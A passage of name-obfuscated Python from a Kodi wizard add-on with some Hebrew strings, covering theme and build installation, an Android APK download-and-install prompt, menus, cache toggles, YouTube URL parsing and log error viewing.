		else :OOO0O00O0OO0O0OO0 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to install the theme:'%COLOR2 ,'[COLOR %s]%s[/COLOR]'%(COLOR1 ,theme ),'for [COLOR %s]%s v%s[/COLOR]?[/COLOR]'%(COLOR1 ,OO0O0OO0000OOOO00 ,wiz .checkBuild (OO0O0OO0000OOOO00 ,'version')),yeslabel ="[B][COLOR green]Install Theme[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel Themes[/COLOR][/B]")#line:4554
		if OOO0O00O0OO0O0OO0 :#line:4555
			O00OO00O0OO0000O0 =wiz .checkTheme (OO0O0OO0000OOOO00 ,theme ,'url')#line:4556
			OOOOOO0O0O0000O00 =OO0O0OO0000OOOO00 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4557
			if not wiz .workingURL (O00OO00O0OO0000O0 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Invalid Zip Url![/COLOR]'%COLOR2 );return False #line:4558
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4559
			DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,theme ),'','Please Wait')#line:4560
			OOOOOOO00O0O0O0O0 =os .path .join (PACKAGES ,'%s.zip'%OOOOOO0O0O0000O00 )#line:4561
			try :os .remove (OOOOOOO00O0O0O0O0 )#line:4562
			except :pass #line:4563
			downloader .download (O00OO00O0OO0000O0 ,OOOOOOO00O0O0O0O0 ,DP )#line:4564
			xbmc .sleep (1000 )#line:4565
			DP .update (0 ,"","Installing %s "%OO0O0OO0000OOOO00 )#line:4566
			O00O00O0OO0O00O0O =False #line:4567
			if url not in ["fresh","normal"]:#line:4568
				O00O00O0OO0O00O0O =testTheme (OOOOOOO00O0O0O0O0 )if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']else False #line:4569
				OOO00OOOOO0O0O00O =testGui (OOOOOOO00O0O0O0O0 )if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']else False #line:4570
				if O00O00O0OO0O00O0O ==True :#line:4571
					wiz .lookandFeelData ('save')#line:4572
					O0O0OOOOO0O0O000O ='skin.confluence'if KODIV <17 else 'skin.estuary'if KODIV <17 else 'skin.anonymous.mod'if KODIV <17 else 'skin.estouchy'if KODIV <17 else 'skin.phenomenal'if KODIV <17 else 'skin.anonymous.nox'if KODIV <17 else 'skin.Premium.mod'#line:4573
					OOOO0OO0OO00000O0 =xbmc .getSkinDir ()#line:4574
					skinSwitch .swapSkins (O0O0OOOOO0O0O000O )#line:4576
					O000O0OO0000OO0O0 =0 #line:4577
					xbmc .sleep (1000 )#line:4578
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O000O0OO0000OO0O0 <150 :#line:4579
						O000O0OO0000OO0O0 +=1 #line:4580
						xbmc .sleep (1000 )#line:4581
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4582
						wiz .ebi ('SendClick(11)')#line:4583
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Skin Swap Timed Out![/COLOR]'%COLOR2 );return #line:4584
					xbmc .sleep (1000 )#line:4585
			O00OOOO00OOOOO0O0 ='[COLOR %s][B]Installing Theme:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,theme )#line:4586
			DP .update (0 ,O00OOOO00OOOOO0O0 ,'','אנא המתן')#line:4587
			O0OOO000OOO0OOOOO ,O00O00OOOOOOOO0O0 ,O000O0OO0OO0OOO0O =extract .all (OOOOOOO00O0O0O0O0 ,HOME ,DP ,title =O00OOOO00OOOOO0O0 )#line:4588
			wiz .setS ('buildtheme',theme )#line:4589
			wiz .log ('INSTALLED %s: [שגיאות:%s]'%(O0OOO000OOO0OOOOO ,O00O00OOOOOOOO0O0 ))#line:4590
			DP .close ()#line:4591
			if url not in ["fresh","normal"]:#line:4592
				wiz .forceUpdate ()#line:4593
				if KODIV >=17 :wiz .kodi17Fix ()#line:4594
				if OOO00OOOOO0O0O00O ==True :#line:4595
					wiz .lookandFeelData ('save')#line:4596
					wiz .defaultSkin ()#line:4597
					OOOO0OO0OO00000O0 =wiz .getS ('defaultskin')#line:4598
					skinSwitch .swapSkins (OOOO0OO0OO00000O0 )#line:4599
					O000O0OO0000OO0O0 =0 #line:4600
					xbmc .sleep (1000 )#line:4601
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O000O0OO0000OO0O0 <150 :#line:4602
						O000O0OO0000OO0O0 +=1 #line:4603
						xbmc .sleep (1000 )#line:4604
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4606
						wiz .ebi ('SendClick(11)')#line:4607
					wiz .lookandFeelData ('restore')#line:4608
				elif O00O00O0OO0O00O0O ==True :#line:4609
					skinSwitch .swapSkins (OOOO0OO0OO00000O0 )#line:4610
					O000O0OO0000OO0O0 =0 #line:4611
					xbmc .sleep (1000 )#line:4612
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O000O0OO0000OO0O0 <150 :#line:4613
						O000O0OO0000OO0O0 +=1 #line:4614
						xbmc .sleep (1000 )#line:4615
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4617
						wiz .ebi ('SendClick(11)')#line:4618
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Skin Swap Timed Out![/COLOR]'%COLOR2 );return #line:4619
					wiz .lookandFeelData ('restore')#line:4620
				else :#line:4621
					wiz .ebi ("ReloadSkin()")#line:4622
					xbmc .sleep (1000 )#line:4623
					wiz .ebi ("Container.Refresh")#line:4624
		else :#line:4625
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 )#line:4626
def skin_homeselect ():#line:4630
	try :#line:4632
		OOOOO0OOOOO0O00OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4633
		OOO000000000OO00O =open (OOOOO0OOOOO0O00OO ,'r')#line:4635
		O0OOO0OO0OOO0O0O0 =OOO000000000OO00O .read ()#line:4636
		OOO000000000OO00O .close ()#line:4637
		OOO0O0000O0OO00OO ='<setting id="HomeS" type="string(.+?)/setting>'#line:4638
		O0000O0OO0000OO00 =re .compile (OOO0O0000O0OO00OO ).findall (O0OOO0OO0OOO0O0O0 )[0 ]#line:4639
		OOO000000000OO00O =open (OOOOO0OOOOO0O00OO ,'w')#line:4640
		OOO000000000OO00O .write (O0OOO0OO0OOO0O0O0 .replace ('<setting id="HomeS" type="string%s/setting>'%O0000O0OO0000OO00 ,'<setting id="HomeS" type="string"></setting>'))#line:4641
		OOO000000000OO00O .close ()#line:4642
	except :#line:4643
		pass #line:4644
def skin_lower ():#line:4647
	O00OOOOO0O0O0O000 =(ADDON .getSetting ("lower"))#line:4648
	if O00OOOOO0O0O0O000 =='true':#line:4649
		try :#line:4652
			O0000O00O0O0O000O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4653
			O00OO00OO000O000O =open (O0000O00O0O0O000O ,'r')#line:4655
			O0O0OO000OOOO0000 =O00OO00OO000O000O .read ()#line:4656
			O00OO00OO000O000O .close ()#line:4657
			O000O0O00OO00000O ='<setting id="none_widget" type="bool(.+?)/setting>'#line:4658
			OOO00O0OO00O00O00 =re .compile (O000O0O00OO00000O ).findall (O0O0OO000OOOO0000 )[0 ]#line:4659
			O00OO00OO000O000O =open (O0000O00O0O0O000O ,'w')#line:4660
			O00OO00OO000O000O .write (O0O0OO000OOOO0000 .replace ('<setting id="none_widget" type="bool%s/setting>'%OOO00O0OO00O00O00 ,'<setting id="none_widget" type="bool">true</setting>'))#line:4661
			O00OO00OO000O000O .close ()#line:4662
		except :#line:4728
			pass #line:4729
def thirdPartyInstall (O000000O0OO0O0O0O ,OO00OO0OOOO00O000 ):#line:4731
	if not wiz .workingURL (OO00OO0OOOO00O000 ):#line:4732
		LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Invalid URL for Build[/COLOR]'%COLOR2 );return #line:4733
	OOOO00OO0OOOOO0OO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to preform a [COLOR %s]Fresh Install[/COLOR] or [COLOR %s]Normal Install[/COLOR] for:[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O000000O0OO0O0O0O ),yeslabel ="[B][COLOR green]Fresh Install[/COLOR][/B]",nolabel ="[B][COLOR red]Normal Install[/COLOR][/B]")#line:4734
	if OOOO00OO0OOOOO0OO ==1 :#line:4735
		freshStart ('third',True )#line:4736
	wiz .clearS ('build')#line:4737
	OO0OO0O0OO0O0O00O =O000000O0OO0O0O0O .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4738
	if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4739
	DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O000000O0OO0O0O0O ),'','אנא המתן')#line:4740
	O0OO00OO00O0000OO =os .path .join (PACKAGES ,'%s.zip'%OO0OO0O0OO0O0O00O )#line:4741
	try :os .remove (O0OO00OO00O0000OO )#line:4742
	except :pass #line:4743
	downloader .download (OO00OO0OOOO00O000 ,O0OO00OO00O0000OO ,DP )#line:4744
	xbmc .sleep (1000 )#line:4745
	O000O0000000OO0OO ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O000000O0OO0O0O0O )#line:4746
	DP .update (0 ,O000O0000000OO0OO ,'','אנא המתן')#line:4747
	OOOO00O0O000O000O ,O00OO0O0O000OOO0O ,OOOO00O0O0OOO0O0O =extract .all (O0OO00OO00O0000OO ,HOME ,DP ,title =O000O0000000OO0OO )#line:4748
	if int (float (OOOO00O0O000O000O ))>0 :#line:4749
		wiz .fixmetas ()#line:4750
		wiz .lookandFeelData ('save')#line:4751
		wiz .defaultSkin ()#line:4752
		wiz .setS ('installed','true')#line:4754
		wiz .setS ('extract',str (OOOO00O0O000O000O ))#line:4755
		wiz .setS ('errors',str (O00OO0O0O000OOO0O ))#line:4756
		wiz .log ('INSTALLED %s: [ERRORS:%s]'%(OOOO00O0O000O000O ,O00OO0O0O000OOO0O ))#line:4757
		try :os .remove (O0OO00OO00O0000OO )#line:4758
		except :pass #line:4759
		if int (float (O00OO0O0O000OOO0O ))>0 :#line:4760
			OO00O000000OO0OOO =DIALOG .yesno (ADDONTITLE ,'[COLOR %s][COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O000000O0OO0O0O0O ),'Completed: [COLOR %s]%s%s[/COLOR] [Errors:[COLOR %s]%s[/COLOR]]'%(COLOR1 ,OOOO00O0O000O000O ,'%',COLOR1 ,O00OO0O0O000OOO0O ),'האם תרצה להציג שגיאות?[/COLOR]',nolabel ='[B][COLOR red]לא תודה[/COLOR][/B]',yeslabel ='[B][COLOR green]הצג שגיאות[/COLOR][/B]')#line:4761
			if OO00O000000OO0OOO :#line:4762
				if isinstance (O00OO0O0O000OOO0O ,unicode ):#line:4763
					OOOO00O0O0OOO0O0O =OOOO00O0O0OOO0O0O .encode ('utf-8')#line:4764
				wiz .TextBox (ADDONTITLE ,OOOO00O0O0OOO0O0O )#line:4765
	DP .close ()#line:4766
	if KODIV >=17 :wiz .addonDatabase (ADDON_ID ,1 )#line:4767
	if INSTALLMETHOD ==1 :OOOO00O00OO00O0O0 =1 #line:4768
	elif INSTALLMETHOD ==2 :OOOO00O00OO00O0O0 =0 #line:4769
	else :OOOO00O00OO00O0O0 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to [COLOR %s]Force close[/COLOR] kodi or [COLOR %s]Reload Profile[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR green]Reload Profile[/COLOR][/B]",nolabel ="[B][COLOR red]Force Close[/COLOR][/B]")#line:4770
	if OOOO00O00OO00O0O0 ==1 :wiz .reloadFix ()#line:4771
	else :wiz .killxbmc (True )#line:4772
def testTheme (O000OO0O0O00000O0 ):#line:4774
	O00OOO00O00OOO00O =zipfile .ZipFile (O000OO0O0O00000O0 )#line:4775
	for O0OOO0000O000OOOO in O00OOO00O00OOO00O .infolist ():#line:4776
		if '/settings.xml'in O0OOO0000O000OOOO .filename :#line:4777
			return True #line:4778
	return False #line:4779
def testGui (O000O00O0O00OOO0O ):#line:4781
	O0000OOOOOOOO00OO =zipfile .ZipFile (O000O00O0O00OOO0O )#line:4782
	for OO00O0OO0OOO000OO in O0000OOOOOOOO00OO .infolist ():#line:4783
		if '/guisettings.xml'in OO00O0OO0OOO000OO .filename :#line:4784
			return True #line:4785
	return False #line:4786
def apkInstaller (OO0O0OO0O0O0OOOO0 ,O000OO000OO0O0000 ):#line:4788
	wiz .log (OO0O0OO0O0O0OOOO0 )#line:4789
	wiz .log (O000OO000OO0O0000 )#line:4790
	if wiz .platform ()=='android':#line:4791
		OOO0000000O0OOO0O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]האם תרצה להוריד ולהתקין את:"%COLOR2 ,"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OO0O0OO0O0O0OOOO0 ),yeslabel ="[B][COLOR green]התקן[/COLOR][/B]",nolabel ="[B][COLOR red]ביטול[/COLOR][/B]")#line:4792
		if not OOO0000000O0OOO0O :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ERROR: Install Cancelled[/COLOR]'%COLOR2 );return #line:4793
		O000000000000OOO0 =OO0O0OO0O0O0OOOO0 #line:4794
		if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4795
		if not wiz .workingURL (O000OO000OO0O0000 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]APK Installer: Invalid Apk Url![/COLOR]'%COLOR2 );return #line:4796
		DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O000000000000OOO0 ),'','אנא המתן')#line:4797
		O0000OOO000O0OO0O =os .path .join (PACKAGES ,"%s.apk"%OO0O0OO0O0O0OOOO0 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|',''))#line:4798
		try :os .remove (O0000OOO000O0OO0O )#line:4799
		except :pass #line:4800
		downloader .download (O000OO000OO0O0000 ,O0000OOO000O0OO0O ,DP )#line:4801
		xbmc .sleep (100 )#line:4802
		DP .close ()#line:4803
		notify .apkInstaller (OO0O0OO0O0O0OOOO0 )#line:4804
		wiz .ebi ('StartAndroidActivity("","android.intent.action.VIEW","application/vnd.android.package-archive","file:'+O0000OOO000O0OO0O +'")')#line:4805
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ERROR: None Android Device[/COLOR]'%COLOR2 )#line:4806
def createMenu (O00OO0O00OO00000O ,OOOOOO0OO00O000OO ,O0OO0OO00OOOO0O0O ):#line:4812
	if O00OO0O00OO00000O =='saveaddon':#line:4813
		O0OOO0OOOO0O00000 =[]#line:4814
		OOO0OO0O0OO00OOOO =urllib .quote_plus (OOOOOO0OO00O000OO .lower ().replace (' ',''))#line:4815
		OO0O0OO0000000O0O =OOOOOO0OO00O000OO .replace ('Debrid','Real Debrid')#line:4816
		OO00O0000OO00OOOO =urllib .quote_plus (O0OO0OO00OOOO0O0O .lower ().replace (' ',''))#line:4817
		O0OO0OO00OOOO0O0O =O0OO0OO00OOOO0O0O .replace ('url','URL Resolver')#line:4818
		O0OOO0OOOO0O00000 .append ((THEME2 %O0OO0OO00OOOO0O0O .title (),' '))#line:4819
		O0OOO0OOOO0O00000 .append ((THEME3 %'Save %s Data'%OO0O0OO0000000O0O ,'RunPlugin(plugin://%s/?mode=save%s&name=%s)'%(ADDON_ID ,OOO0OO0O0OO00OOOO ,OO00O0000OO00OOOO )))#line:4820
		O0OOO0OOOO0O00000 .append ((THEME3 %'Restore %s Data'%OO0O0OO0000000O0O ,'RunPlugin(plugin://%s/?mode=restore%s&name=%s)'%(ADDON_ID ,OOO0OO0O0OO00OOOO ,OO00O0000OO00OOOO )))#line:4821
		O0OOO0OOOO0O00000 .append ((THEME3 %'Clear %s Data'%OO0O0OO0000000O0O ,'RunPlugin(plugin://%s/?mode=clear%s&name=%s)'%(ADDON_ID ,OOO0OO0O0OO00OOOO ,OO00O0000OO00OOOO )))#line:4822
	elif O00OO0O00OO00000O =='save':#line:4823
		O0OOO0OOOO0O00000 =[]#line:4824
		OOO0OO0O0OO00OOOO =urllib .quote_plus (OOOOOO0OO00O000OO .lower ().replace (' ',''))#line:4825
		OO0O0OO0000000O0O =OOOOOO0OO00O000OO .replace ('Debrid','Real Debrid')#line:4826
		OO00O0000OO00OOOO =urllib .quote_plus (O0OO0OO00OOOO0O0O .lower ().replace (' ',''))#line:4827
		O0OO0OO00OOOO0O0O =O0OO0OO00OOOO0O0O .replace ('url','URL Resolver')#line:4828
		O0OOO0OOOO0O00000 .append ((THEME2 %O0OO0OO00OOOO0O0O .title (),' '))#line:4829
		O0OOO0OOOO0O00000 .append ((THEME3 %'Register %s'%OO0O0OO0000000O0O ,'RunPlugin(plugin://%s/?mode=auth%s&name=%s)'%(ADDON_ID ,OOO0OO0O0OO00OOOO ,OO00O0000OO00OOOO )))#line:4830
		O0OOO0OOOO0O00000 .append ((THEME3 %'Save %s Data'%OO0O0OO0000000O0O ,'RunPlugin(plugin://%s/?mode=save%s&name=%s)'%(ADDON_ID ,OOO0OO0O0OO00OOOO ,OO00O0000OO00OOOO )))#line:4831
		O0OOO0OOOO0O00000 .append ((THEME3 %'Restore %s Data'%OO0O0OO0000000O0O ,'RunPlugin(plugin://%s/?mode=restore%s&name=%s)'%(ADDON_ID ,OOO0OO0O0OO00OOOO ,OO00O0000OO00OOOO )))#line:4832
		O0OOO0OOOO0O00000 .append ((THEME3 %'Import %s Data'%OO0O0OO0000000O0O ,'RunPlugin(plugin://%s/?mode=import%s&name=%s)'%(ADDON_ID ,OOO0OO0O0OO00OOOO ,OO00O0000OO00OOOO )))#line:4833
		O0OOO0OOOO0O00000 .append ((THEME3 %'Clear Addon %s Data'%OO0O0OO0000000O0O ,'RunPlugin(plugin://%s/?mode=addon%s&name=%s)'%(ADDON_ID ,OOO0OO0O0OO00OOOO ,OO00O0000OO00OOOO )))#line:4834
	elif O00OO0O00OO00000O =='install':#line:4835
		O0OOO0OOOO0O00000 =[]#line:4836
		OO00O0000OO00OOOO =urllib .quote_plus (O0OO0OO00OOOO0O0O )#line:4837
		O0OOO0OOOO0O00000 .append ((THEME2 %O0OO0OO00OOOO0O0O ,'RunAddon(%s, ?mode=viewbuild&name=%s)'%(ADDON_ID ,OO00O0000OO00OOOO )))#line:4838
		O0OOO0OOOO0O00000 .append ((THEME3 %'Fresh Install','RunPlugin(plugin://%s/?mode=install&name=%s&url=fresh)'%(ADDON_ID ,OO00O0000OO00OOOO )))#line:4839
		O0OOO0OOOO0O00000 .append ((THEME3 %'Normal Install','RunPlugin(plugin://%s/?mode=install&name=%s&url=normal)'%(ADDON_ID ,OO00O0000OO00OOOO )))#line:4840
		O0OOO0OOOO0O00000 .append ((THEME3 %'Apply guiFix','RunPlugin(plugin://%s/?mode=install&name=%s&url=gui)'%(ADDON_ID ,OO00O0000OO00OOOO )))#line:4841
		O0OOO0OOOO0O00000 .append ((THEME3 %'Build Information','RunPlugin(plugin://%s/?mode=buildinfo&name=%s)'%(ADDON_ID ,OO00O0000OO00OOOO )))#line:4842
	O0OOO0OOOO0O00000 .append ((THEME2 %'%s Settings'%ADDONTITLE ,'RunPlugin(plugin://%s/?mode=settings)'%ADDON_ID ))#line:4843
	return O0OOO0OOOO0O00000 #line:4844
def toggleCache (O000OO0O00OO0OOOO ):#line:4846
	O0O0000O0O0000OO0 =['includevideo','includeall','includebob','includephoenix','includespecto','includegenesis','includeexodus','includeonechan','includesalts','includesaltslite']#line:4847
	OOO00O0000OOO0O0O =['Include Video Addons','Include All Addons','Include Bob','Include Phoenix','Include Specto','Include Genesis','Include Exodus','Include One Channel','Include Salts','Include Salts Lite HD']#line:4848
	if O000OO0O00OO0OOOO in ['true','false']:#line:4849
		for OOOOOO0000OO000OO in O0O0000O0O0000OO0 :#line:4850
			wiz .setS (OOOOOO0000OO000OO ,O000OO0O00OO0OOOO )#line:4851
	else :#line:4852
		if not O000OO0O00OO0OOOO in ['includevideo','includeall']and wiz .getS ('includeall')=='true':#line:4853
			try :#line:4854
				OOOOOO0000OO000OO =OOO00O0000OOO0O0O [O0O0000O0O0000OO0 .index (O000OO0O00OO0OOOO )]#line:4855
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]You will need to turn off [COLOR %s]Include All Addons[/COLOR] to disable[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ,OOOOOO0000OO000OO ))#line:4856
			except :#line:4857
				wiz .LogNotify ("[COLOR %s]Toggle Cache[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid id: %s[/COLOR]"%(COLOR2 ,O000OO0O00OO0OOOO ))#line:4858
		else :#line:4859
			OO00000OO00O00OO0 ='true'if wiz .getS (O000OO0O00OO0OOOO )=='false'else 'false'#line:4860
			wiz .setS (O000OO0O00OO0OOOO ,OO00000OO00O00OO0 )#line:4861
def playVideo (OO00OO0O0000O00O0 ):#line:4863
	wiz .log ("YouTube CCCCCCCCCCCCCCCCCCCCCCCCCCC URL: %s"%OO00OO0O0000O00O0 )#line:4864
	if 'watch?v='in OO00OO0O0000O00O0 :#line:4865
		O000OOO0OOO0OO0O0 ,OO00O0O00O00OOOO0 =OO00OO0O0000O00O0 .split ('?')#line:4866
		OOOOO0O0OOOOO0000 =OO00O0O00O00OOOO0 .split ('&')#line:4867
		for OO0000000OOO00OO0 in OOOOO0O0OOOOO0000 :#line:4868
			if OO0000000OOO00OO0 .startswith ('v='):#line:4869
				OO00OO0O0000O00O0 =OO0000000OOO00OO0 [2 :]#line:4870
				break #line:4871
			else :continue #line:4872
	elif 'embed'in OO00OO0O0000O00O0 or 'youtu.be'in OO00OO0O0000O00O0 :#line:4873
		wiz .log ("YouTube BBBBBBBBBBBBBBBBBBBBBBBBB URL: %s"%OO00OO0O0000O00O0 )#line:4874
		O000OOO0OOO0OO0O0 =OO00OO0O0000O00O0 .split ('/')#line:4875
		if len (O000OOO0OOO0OO0O0 [-1 ])>5 :#line:4876
			OO00OO0O0000O00O0 =O000OOO0OOO0OO0O0 [-1 ]#line:4877
		elif len (O000OOO0OOO0OO0O0 [-2 ])>5 :#line:4878
			OO00OO0O0000O00O0 =O000OOO0OOO0OO0O0 [-2 ]#line:4879
	wiz .log ("YouTube URL: %s"%OO00OO0O0000O00O0 )#line:4880
	yt .PlayVideo (OO00OO0O0000O00O0 )#line:4881
def viewLogFile ():#line:4883
	OO0O00OOO00O0OO0O =wiz .Grab_Log (True )#line:4884
	O0O0000O000OOOOO0 =wiz .Grab_Log (True ,True )#line:4885
	OOO00OO0OOO0OOO00 =0 ;OO0OOOO00OOOOOO00 =OO0O00OOO00O0OO0O #line:4886
	if not O0O0000O000OOOOO0 ==False and not OO0O00OOO00O0OO0O ==False :#line:4887
		OOO00OO0OOO0OOO00 =DIALOG .select (ADDONTITLE ,["View %s"%OO0O00OOO00O0OO0O .replace (LOG ,""),"View %s"%O0O0000O000OOOOO0 .replace (LOG ,"")])#line:4888
		if OOO00OO0OOO0OOO00 ==-1 :wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]View Log Cancelled![/COLOR]'%COLOR2 );return #line:4889
	elif OO0O00OOO00O0OO0O ==False and O0O0000O000OOOOO0 ==False :#line:4890
		wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]No Log File Found![/COLOR]'%COLOR2 )#line:4891
		return #line:4892
	elif not OO0O00OOO00O0OO0O ==False :OOO00OO0OOO0OOO00 =0 #line:4893
	elif not O0O0000O000OOOOO0 ==False :OOO00OO0OOO0OOO00 =1 #line:4894
	OO0OOOO00OOOOOO00 =OO0O00OOO00O0OO0O if OOO00OO0OOO0OOO00 ==0 else O0O0000O000OOOOO0 #line:4896
	OOOO00O0OOO0OOOOO =wiz .Grab_Log (False )if OOO00OO0OOO0OOO00 ==0 else wiz .Grab_Log (False ,True )#line:4897
	wiz .TextBox ("%s - %s"%(ADDONTITLE ,OO0OOOO00OOOOOO00 ),OOOO00O0OOO0OOOOO )#line:4899
def errorChecking (log =None ,count =None ,all =None ):#line:4901
	if log ==None :#line:4902
		O0OO0OOO00OO00OO0 =wiz .Grab_Log (True )#line:4903
		OO0O0O0O0OOO0O0OO =wiz .Grab_Log (True ,True )#line:4904
		if not OO0O0O0O0OOO0O0OO ==False and not O0OO0OOO00OO00OO0 ==False :#line:4905
			O0OO0O0OO00000O00 =DIALOG .select (ADDONTITLE ,["View %s: %s error(s)"%(O0OO0OOO00OO00OO0 .replace (LOG ,""),errorChecking (O0OO0OOO00OO00OO0 ,True ,True )),"View %s: %s error(s)"%(OO0O0O0O0OOO0O0OO .replace (LOG ,""),errorChecking (OO0O0O0O0OOO0O0OO ,True ,True ))])#line:4906
			if O0OO0O0OO00000O00 ==-1 :wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]View Log Cancelled![/COLOR]'%COLOR2 );return #line:4907
		elif O0OO0OOO00OO00OO0 ==False and OO0O0O0O0OOO0O0OO ==False :#line:4908
			wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]No Log File Found![/COLOR]'%COLOR2 )#line:4909
			return #line:4910
		elif not O0OO0OOO00OO00OO0 ==False :O0OO0O0OO00000O00 =0 #line:4911
		elif not OO0O0O0O0OOO0O0OO ==False :O0OO0O0OO00000O00 =1 #line:4912
		log =O0OO0OOO00OO00OO0 if O0OO0O0OO00000O00 ==0 else OO0O0O0O0OOO0O0OO #line:4913
	if log ==False :#line:4914
		if count ==None :#line:4915
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Log File not Found[/COLOR]"%COLOR2 )#line:4916
			return False #line:4917
		else :#line:4918
			return 0 #line:4919
	else :#line:4920
		if os .path .exists (log ):#line:4921
			O0OOOOO0OO0O0000O =open (log ,mode ='r');O00OOOO0OO00O0O00 =O0OOOOO0OO0O0000O .read ().replace ('\n','').replace ('\r','');O0OOOOO0OO0O0000O .close ()#line:4922
			OO0OOO00000OOO0O0 =re .compile ("-->Python callback/script returned the following error<--(.+?)-->End of Python script error report<--").findall (O00OOOO0OO00O0O00 )#line:4923
			if not count ==None :#line:4924
				if all ==None :#line:4925
					OOOO000O0OOOO00OO =0 #line:4926
					for O000O0O00OO0000OO in OO0OOO00000OOO0O0 :#line:4927
						if ADDON_ID in O000O0O00OO0000OO :OOOO000O0OOOO00OO +=1 #line:4928
					return OOOO000O0OOOO00OO #line:4929
				else :return len (OO0OOO00000OOO0O0 )#line:4930
			if len (OO0OOO00000OOO0O0 )>0 :#line:4931
				OOOO000O0OOOO00OO =0 ;OOOO00O00O0OO0O0O =""#line:4932
				for O000O0O00OO0000OO in OO0OOO00000OOO0O0 :#line:4933
					if all ==None and not ADDON_ID in O000O0O00OO0000OO :continue #line:4934
					else :#line:4935
						OOOO000O0OOOO00OO +=1 #line:4936
						OOOO00O00O0OO0O0O +="[COLOR red]Error Number %s[/COLOR]\n(PythonToCppException) : -->Python callback/script returned the following error<--%s-->End of Python script error report<--\n\n"%(OOOO000O0OOOO00OO ,O000O0O00OO0000OO .replace ('                                          ','\n').replace ('\\\\','\\').replace (HOME ,''))#line:4937
				if OOOO000O0OOOO00OO >0 :#line:4938
					wiz .TextBox (ADDONTITLE ,OOOO00O00O0OO0O0O )#line:4939
				else :wiz .LogNotify (ADDONTITLE ,"No Errors Found in Log")#line:4940
			else :wiz .LogNotify (ADDONTITLE ,"No Errors Found in Log")#line:4941
		else :wiz .LogNotify (ADDONTITLE ,"Log File not Found")#line:4942
ACTION_PREVIOUS_MENU =10 #line:4944
ACTION_NAV_BACK =92 #line:4945
ACTION_MOVE_LEFT =1 #line:4946
ACTION_MOVE_RIGHT =2 #line:4947
ACTION_MOVE_UP =3 #line:4948
ACTION_MOVE_DOWN =4 #line:4949
ACTION_MOUSE_WHEEL_UP =104 #line:4950
ACTION_MOUSE_WHEEL_DOWN =105 #line:4951
ACTION_MOVE_MOUSE =107 #line:4952
ACTION_SELECT_ITEM =7 #line:4953
ACTION_BACKSPACE =110 #line:4954
ACTION_MOUSE_LEFT_CLICK =100 #line:4955
